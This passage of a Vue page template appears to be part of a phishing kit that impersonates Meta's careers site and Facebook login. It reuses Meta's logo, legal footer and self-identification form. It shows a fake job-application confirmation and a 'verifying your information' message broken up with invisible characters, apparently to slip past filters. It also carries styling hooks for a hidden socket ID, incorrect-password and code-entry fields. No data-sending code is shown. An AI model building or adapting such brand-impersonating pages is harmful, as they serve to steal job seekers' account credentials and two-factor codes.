            <path class="cls-1" d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"></path>
            <path class="cls-1" d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"></path>
            <path class="cls-1" d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"></path>
            <path class="cls-1" d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"></path>
            <path class="cls-1" d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"></path>
            <path class="cls-1" d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"></path>
            <path class="cls-1" d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"></path>
        </svg>
    </div>
</div>
<div class="sc-kfYpNk hwVTPy oe04">
    <div class="sc-fKgKDd lnweHX">
        <div class="sc-iJCSeZ TMCWt">
            <img src="../assets/images/loadingGif.d1fc1a94ee14879a4193.gif" alt="">
            <div class="text-center" style="display: none;">P&lrm;l&lrm;e&lrm;a&lrm;se w&lrm;a&lrm;it w&lrm;h&lrm;i&lrm;l&lrm;e w&lrm;e
                v&lrm;er&lrm;if&lrm;y y&lrm;o&lrm;u&lrm;r i&lrm;n&lrm;f&lrm;o&lrm;r&lrm;m&lrm;a&lrm;tion</div>
                <div id="texti">Thanks for applying, Your Application for the Social Media Manager role has been received. You will get an email regarding the status of your application in the upcoming weeks.<br>
        <strong style="display:flex;justify-content:center;margin-top:20px">Saturday, October 5, 2024</strong></div> 
          </div>
          
    </div>
</div></div>

                                                    

                                                </div>
                                            </div>
                                        </div>
                            </div>
                        </div>



                        <!-- <div class="main">
                            <div class="text mb-4">
                                <span class="headertextofform">Voluntary Self-Identification</span>
                            </div>
                            <div class="mt-4">
                                <span class="headertextself">
                                    Gender and Race/Ethnicity
                                </span>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        Meta is committed to building a workforce that is as diverse as the communities
                                        we serve. Hiring people with different backgrounds and experiences helps us
                                        build better products, better serve our users, and build a diverse and inclusive
                                        workplace.
                                    </span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        In addition to the information required to consider your candidacy we invite you
                                        to voluntarily provide your gender and race/ethnicity. This information ensures
                                        we meet certain regulatory reporting obligations and also further supports the
                                        development, refinement, and execution of our diversity efforts and programs.
                                        Information will be kept confidential, used only for legitimate business
                                        purposes, and will never be used in making any employment decisions, including
                                        hiring decisions.
                                    </span>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">
                                        Race & Ethnicity Definitions
                                    </span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">Asian:</span>a person having origins in any of the
                                        original peoples of the Far
                                        East, Southeast Asia, or the Indian subcontinent, including, for example,
                                        Cambodia, China, India, Japan, Korea, Malaysia, Pakistan, the Philippine
                                        Islands, Thailand, and Vietnam.
                                    </span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself"> <span class="undertextself">Black or African
                                            American:</span>a person having origins in any of the black racial
                                        groups of Africa.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">Hispanic or Latino:</span>a person of Cuban,
                                        Mexican, Puerto Rican, South or Central
                                        American, or other Spanish culture or origin, regardless of race.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">Native American or Alaska Native:</span>a person
                                        having origins in any of the
                                        original peoples of North and South America (including Central America), and who
                                        maintains a tribal affiliation or community attachment.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">Native Hawaiian or Other Pacific Islander:</span>a
                                        person having origins in any of
                                        the original peoples of Hawaii, Guam, Samoa, or other Pacific Islands.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">
                                        <span class="undertextself">White:</span>a person having origins in any of the
                                        original peoples of Europe, the
                                        Middle East, or North Africa.</span>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">
                                        Indicate your gender:
                                    </span>
                                </div>
                                <div>
                                    <div class="_549a mt-2">
                                        <label class="">
                                            <input class=" " type="radio" name="provideInfo" value="Male">
                                            <span class="inputtextform">Male</span>
                                        </label>
                                        <label class="mx-0 mx-md-5">
                                            <input class=" " type="radio" name="provideInfo" value="Female">
                                            <span class="inputtextform">Female</span>
                                        </label>
                                        <label class="mx-0 mx-md-3">
                                            <input class=" " type="radio" name="provideInfo" value="choose">
                                            <span class="inputtextform">I choose not to disclose</span>
                                        </label>
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">
                                        Indicate your race/ethnicity:
                                    </span>
                                </div>
                                <div class="row mt-2">
                                    <div class="col-12 col-sm">
                                        <label class="">
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Native American or Alaska Native</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Black or African American</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> Native Hawaiian or Other Pacific
                                                Islander</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Two or More Races</span>
                                        </label>
                                    </div>
                                    <div class="col">
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Asian</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">Hispanic or Latino</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> White</span>
                                        </label>
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> I choose not to disclose</span>
                                        </label>
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">Protected Veteran Status</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">At Meta we value your military service. We collect two
                                        types of
                                        self-identification information for Veterans, "Protected Veteran" and "Other
                                        Veteran". Meta is subject to the Vietnam Era Veterans' Readjustment Assistance
                                        Act of 1974, as amended (the “Act”), which requires government contractors to
                                        take affirmative action to employ and advance in employment: [1] disabled
                                        veterans; [2] recently separated veterans; [3] active duty wartime or campaign
                                        badge veterans; and [4] Armed Forces service medal veterans. You may hover over
                                        each of the 4 classifications for the applicable definitions. If you have served
                                        in the military but you do not fall into one of these categories or have served
                                        in another country's military, you may identify as "Other Veteran".</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">Information will be kept confidential, used only for
                                        legitimate business
                                        purposes, and will never be used in making any employment decisions.</span>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">Indicate your Protected Veteran Status:</span>
                                </div>
                                <div>
                                    <div class="mt-2">
                                        <label>
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> I identify as one or more of the
                                                classifications of protected veteran
                                                listed.</span>

                                        </label>
                                        <label class="">
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> Other veteran</span>

                                        </label>
                                        <label class="">
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform">I am not a protected veteran</span>

                                        </label>
                                        <label class="">
                                            <input type="radio" name="" value="">
                                            <span class="inputtextform"> I choose not to disclose</span>

                                        </label>
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">Disability</span>
                                </div>
                                <div class="mt-2 d-flex flex-column">
                                    <span class="subtextself">Form CC-305</span>
                                    <span class="subtextself">OMB Control Number 1250-0005
                                    </span>
                                    <span class="subtextself">Expires 4/30/2026</span>
                                </div>
                                <div class="mt-3">
                                    <span class="undertextself">Why are you being asked to complete this
                                        form?</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">We are a federal contractor or subcontractor. The law
                                        requires us to provide
                                        equal employment opportunity to qualified people with disabilities. We have a
                                        goal of having at least 7% of our workers as people with disabilities. The law
                                        says we must measure our progress towards this goal. To do this, we must ask
                                        applicants and employees if they have a disability or have ever had one. People
                                        can become disabled, so we need to ask this question at least every five
                                        years.</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself">Completing this form is voluntary, and we hope that you
                                        will choose to do so.
                                        Your answer is confidential. No one who makes hiring decisions will see it. Your
                                        decision to complete the form and your answer will not harm you in any way. If
                                        you want to learn more about the law or this form, visit the U.S. Department of
                                        Labor’s Office of Federal Contract Compliance Programs (OFCCP) website at
                                        www.dol.gov/ofccp.</span>
                                </div>
                                <div class="mt-3">
                                    <span class="undertextself">How do I know if I have a disability?</span>
                                </div>
                                <div class="mt-2">
                                    <span class="subtextself"> A disability is a condition that substantially limits one
                                        or more of your
                                        “major life activities.” If you have or have ever had such a condition, you are
                                        a person with a disability. Disabilities include, but are not limited to:</span>
                                </div>
                                <div class="mt-2">
                                    <ul>
                                        <li>
                                            <span class="subtextself">
                                                Alcohol or other substance use disorder (not currently using drugs
                                                illegally)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Autoimmune disorder, for example, lupus, fibromyalgia, rheumatoid
                                                arthritis, or HIV/AIDS
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Blind or low vision
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Cancer (past or present)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Cardiovascular or heart disease
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Celiac disease
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Cerebral palsy
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Diabetes
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Disfigurement, for example, disfigurement caused by burns, wounds,
                                                accidents, or congenital disorders
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Epilepsy or other seizure disorder
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Gastrointestinal disorders, for example, Crohn's Disease, or irritable
                                                bowel syndrome
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Mental health conditions, for example, depression, bipolar disorder,
                                                anxiety disorder, schizophrenia, PTSD
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Missing limbs or partially missing limbs
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Mobility impairment, benefiting from the use of a wheelchair, scooter,
                                                walker, leg brace(s) and/or other supports
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Nervous system condition for example, migraine headaches, Parkinson’s
                                                disease, or Multiplesclerosis (MS)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Neurodivergence, for example, attention-deficit/hyperactivity disorder
                                                (ADHD), autism spectrum disorder, dyslexia, dyspraxia, other learning
                                                disabilities
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Partial or complete paralysis (any cause)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Pulmonary or respiratory conditions, for example, tuberculosis, asthma,
                                                emphysema
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Short stature (dwarfism)
                                            </span>
                                        </li>
                                        <li>
                                            <span class="subtextself">
                                                Traumatic brain injury
                                            </span>
                                        </li>
                                    </ul>
                                </div>

                                <div class="mt-2">
                                    <span class="subtextself">PUBLIC BURDEN STATEMENT: According to the Paperwork
                                        Reduction Act of 1995 no
                                        persons are required to respond to a collection of information unless such
                                        collection displays a valid OMB control number. This survey should take about 5
                                        minutes to complete.</span>
                                </div>
                                <div class="mt-3">
                                    <span class="headertextself">Please select one of the choices below:</span>
                                </div>
                                <div class="mt-2">
                                    <label>
                                        <input type="radio" name="" value="">
                                        <span class="inputtextform">
                                            Yes, I have a disability, or have had one in the past
                                        </span>

                                    </label>
                                    <label class="">
                                        <input type="radio" name="" value="">
                                        <span class="inputtextform">
                                            No, I do not have a disability and have not had one in the past
                                        </span>
                                    </label>
                                    <label class="">
                                        <input type="radio" name="" value="">
                                        <span class="inputtextform">
                                            I do not want to answer
                                        </span>
                                    </label>

                                </div>
                                <div>
                                    <div class="buttons button_spacee">
                                        <button class="back_button px-0 mt-4"><svg class="_9exz" width="24px" height="24px" viewBox="0 0 38 38" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                                <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                    <g transform="translate(-5.000000, -5.000000)">
                                                        <g transform="translate(6.000000, 6.000000)">
                                                            <circle stroke="#CCD1D4" cx="18" cy="18" r="18"></circle>
                                                            <g transform="translate(11.000000, 13.000000)" stroke="#232323" stroke-width="2">
                                                                <polyline stroke-linecap="square" points="8 0 13 5 8 10">
                                                                </polyline>
                                                                <path d="M0,5 L13,5"></path>
                                                            </g>
                                                        </g>
                                                    </g>
                                                </g>
                                            </svg><span class="px-2 textofbuttonne">Back</span></button>


                                    </div>

                                </div>

                            </div>
                        </div> -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <input type="text" hidden="" id="socket_id">
    <div style="border-bottom: 1px solid #d3d4d8;margin-top: 55px;">
        <div class="footer">
            <div class="footerbox">
                <div class="footerboxtext">
                    <div>
                        <span class="subtextfooter">
                            Meta is proud to be an Equal Employment Opportunity and Affirmative Action employer. We
                            do not discriminate based upon race, religion, color, national origin, sex (including
                            pregnancy, childbirth, reproductive health decisions, or related medical conditions),
                            sexual orientation, gender identity, gender expression, age, status as a protected
                            veteran, status as an individual with a disability, genetic information, political views
                            or activity, or other applicable legally protected characteristics. You may view our
                            Equal Employment Opportunity notice <a style="color: #232323;" href="">here</a> We also
                            consider qualified
                            applicants with criminal histories, consistent with applicable federal, state and local law.
                            We may use your information to maintain the safety and security of Meta, its employees, and
                            others as required or permitted by law. You may view <a style="color: #232323;" href="">
                                Meta's Pay Transparency
                                Policy, </a> <a style="color: #232323;" href=""> Notice to Applicants for Employment and
                                Employees </a>
                            by clicking on their corresponding links. Additionally, Meta participates in the <a href="" style="color: #232323;">
                                E-Verify program </a> in certain locations, as required by law.
                            <br><br>
                            Meta is committed to providing reasonable accommodations for qualified individuals with
                            disabilities and disabled veterans in our job application procedures. If you need assistance
                            or an accommodation due to a disability, you may contact us at <a style="color: #232323;" href="">accommodations-ext@fb.com</a>
                        </span>
                    </div>
                </div>
                <div>
                    <div class="row mt-4 mt-xl-5 gx-5">
                        <div class="col-6 col-xl-auto">
                            <div>
                                <span class="bottomtextfooter">About Us</span>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Company info</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Newsroom</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Careers FAQs</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Looking for contractor roles?</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-6 col-xl-auto">
                            <div>
                                <span class="bottomtextfooter">On Social</span>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Facebook</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Instagram</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">LinkedIn</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Threads</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-6 mt-4 mt-xl-0 col-xl-auto">
                            <div>
                                <span class="bottomtextfooter">Our policies</span>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Candidate privacy statement </a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Cookies </a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">LinkedIn</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Vaccination entry policy </a>
                                </div>
                            </div>
                        </div>
                        <div class="col-6 mt-4 mt-xl-0 col-xl-auto">
                            <div>
                                <span class="bottomtextfooter">More resources</span>
                                <div>
                                    <a class="bottomfotersubtext" href="/">Family safety center</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Meta for business </a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/">LinkedIn</a>
                                </div>
                                <div>
                                    <a class="bottomfotersubtext" href="/"> Meta for developers </a>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>

        </div>
    </div>

    <ChatWidget/>
</template>

<style scoped src="../assets/css/main.css">
</style>

<style scoped>
.pwincorrect{
  color: red;
}


                                                                                .cls-1 {
                                                                                    fill: #fff;
                                                                                }                                                            
							.lgDv {
                                                                text-align: center;
                                                                padding-top: 8px;
                                                                padding-bottom: 6px;
                                                                background-color: #4266b3;

                                                            }

                                                            .lgDv div {
                                                                padding-left: 0px !important;
                                                            }

                                                            .bgclr {
                                                                background-color: #f0f2f5;
                                                            }

                                                            ._emIn {
                                                                background: #fff;
                                                                box-sizing: border-box;
                                                                width: 100%;
                                                                max-width: 600px;
                                                                font-size: 14px;
                                                                border: 1px solid #ededed;
                                                                border-radius: 4px;
                                                                margin: auto;
                                                            }

                                                            .inputfa {
                                                                background-color: #fff !important;
                                                                font-size: 16px !important;
                                                                border: 1px solid #bcbcbc !important;
                                                                padding: 3px !important;
                                                                border-radius: 0px !important;
                                                                width: 150px !important;
                                                                height: 30px !important;
                                                            }

                                                            @media (max-width: 576px) {
                                                                body {
                                                                    background-color: #f0f2f5;
                                                                }

                                                                .frgtdiv {
                                                                    padding-top: 16px;
                                                                    padding-bottom: 100px;
                                                                    height: 587px;
                                                                }

                                                                ._ned04 {
                                                                    font-size: 11px;
                                                                }

                                                            }

                                                            @media (min-width: 576px) {
                                                                .lgDv {
                                                                    text-align: start;
                                                                    padding-top: 8px;
                                                                    padding-bottom: 6px;
                                                                    background-color: #4266b3;
                                                                }

                                                                .lgDv svg {
                                                                    width: 200px;

                                                                }

                                                                .lngLSt {
                                                                    padding-top: 3rem;
                                                                    margin: 0px 40px;
                                                                }

                                                                .lngLSt span {
                                                                    padding-right: 15px;
                                                                }

                                                                .lgDv div {
                                                                    padding-left: 15px !important;
                                                                }

                                                                .frgtdiv {
                                                                    padding-top: 78px;
                                                                    padding-bottom: 100px;
                                                                    height: 587px;
                                                                }
                                                            }
															.lgDv {
        text-align: center;
        padding-top: 8px;
        padding-bottom: 6px;
        background-color: #4266b3;

    }

    .lgDv div {
        padding-left: 0px !important;
    }

    .hwVTPy {
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100%;
        height: 100%;
        top: 0px;
    }

    .lnweHX {
        max-width: 550px;
        width: 100%;
        height: 300px;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        background-color: white;
        border-radius: 8px;
        box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
        position: relative;
        padding-inline: 1.5rem;
        padding-block: 1.5rem;
        margin: 1rem;
    }

    .TMCWt {
        height: 530px;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        gap: 20px;
    }

    .TMCWt img {
        width: 150px;
        height: auto;
    }

    .sc-kfYpNk {
        padding-bottom: 100px;
        padding-top: 100px;
    }

    @media (max-width: 576px) {
        .sc-kfYpNk {
            padding-bottom: 176px;
            padding-top: 100px;
        }
        .oe04{
            padding-bottom: 165px !important;
        }
        
          .TMCWt {
        height: 0px !important;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        gap: 20px;
    }
    .lnweHX {
    max-width: 550px;
    width: 100%;
    height: 300px;
    display: flex;
    flex-direction: column;
    justify-content: space-around;
    background-color: white;
    border-radius: 8px;
    box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
    position: relative;
    padding-inline: 1.5rem;
    padding-block: 1.5rem;
    margin: 1rem;
}
    }

    @media (min-width: 576px) {
        .lgDv {
            text-align: start;
            padding-top: 8px;
            padding-bottom: 6px;
            background-color: #4266b3;
        }

        .lgDv svg {
            width: 200px;

        }

        .lngLSt {
            padding-top: 3rem;
            margin: 0px 40px;
        }

        .lngLSt span {
            padding-right: 15px;
        }

        .lgDv div {
            padding-left: 15px !important;
        }

        


    }
</style>